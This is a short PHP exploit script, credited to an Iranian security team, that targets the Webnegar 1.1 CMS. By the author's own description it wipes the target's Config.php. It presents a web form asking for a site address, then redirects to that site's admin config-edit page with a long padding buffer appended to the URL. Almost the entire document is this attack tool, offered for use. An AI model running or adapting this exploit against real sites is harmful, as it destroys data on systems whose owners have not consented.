<?php
        //EXPlOIT For Webnegar 1.1
        //www.simorgh-ev.com
        /* PHP Lang.
***************************************************************************
* Iranian Security Team : WWW.SIMORGH-EV.COM                              *
* This Program By Hossein Asgary                                          *
* Note : Webnegar IS The best Cms For Iranian WebMasetr .                 *
* I Detect 7 bug in this Portal . But .. I am wait To Next Version  :D    *
* This Exploit For Clear All Thing in Config.php & Attack To Comment .    *
* e-mail : admin(at)simorgh-ev(dot)com                                    *
* Enjoy :)                                                                *
***************************************************************************
        */
        // this buffer nO necessery For All version ... :)
$buffer="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

if ($attackers1=$_GET['Attack1']){

 header("Location:$attackers1/admin/conf_edit.php?$buffer");
}
        ?>
        <html>
    <Head>
        <Title> Attack 2 Webnegar 1.1 </Title>
    </Head>
    <body>
    <p>
    <form method="GET" name="form1" action="" >
    <center>
     Attack 1 (Config) <br>
     --------<br>
     Enter Site Address :<br>
    <input type="text" name="Attack1" value="http://" size="20" ><br>
    <input type="submit"  Value=" Attack 1" ><br>
    <p>
    </center>
    </form>
    <center>
    -----------------------------------------

        </center>
                </form>
                </body>
                </html>
?>
